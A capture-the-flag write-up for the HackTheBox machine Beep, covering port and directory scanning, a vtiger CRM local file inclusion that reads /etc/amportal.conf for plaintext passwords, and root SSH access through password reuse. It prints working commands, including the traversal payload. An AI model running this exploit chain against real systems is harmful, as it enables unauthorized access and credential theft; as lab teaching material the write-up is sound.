Beep

HackTheBox, Easy

Beep runs Elastix, a phone system built on Asterisk. An LFI in the bundled vtiger CRM's graph.php reads /etc/amportal.conf, which stores passwords in clear text, and one of them is reused by root over SSH.

Reconnaissance

There are lots of ports: SSH, mail (SMTP, POP3, IMAP), MySQL, Asterisk (5038), Webmin (10000) and HTTPS with the Elastix login. OpenSSH 4.3 hints at a very old system.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
# 22, 25, 80, 110, 111, 143, 443, 993, 995, 3306, 4190, 4445, 4559, 5038, 10000
nmap -Pn -n -sT -sV -sC -p22,443 <IP>
# 22 OpenSSH 4.3, 443 ssl/https (Elastix)

Directory fuzzing finds, among others, /vtigercrm.

ffuf -u https://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt
# admin, mail, panel, recordings, vtigercrm...

Exploitation - vtiger LFI

The current_language parameter of graph.php goes into an include with no validation (EDB-37637). With path traversal and a null byte to cut off the extension, we read amportal.conf, where FreePBX keeps its admin passwords.

curl -sk "https://<IP>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" | grep -E 'PASS'
# AMPDBPASS=..., AMPMGRPASS=..., ARI_ADMIN_PASSWORD=...

Escalation - password reuse

The same password shows up in several entries of the file. Tried over SSH as root, it works. OpenSSH 4.3 only speaks old algorithms, which a modern client has to re-enable.

ssh -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa root@<IP>
cat /home/fanis/user.txt /root/root.txt
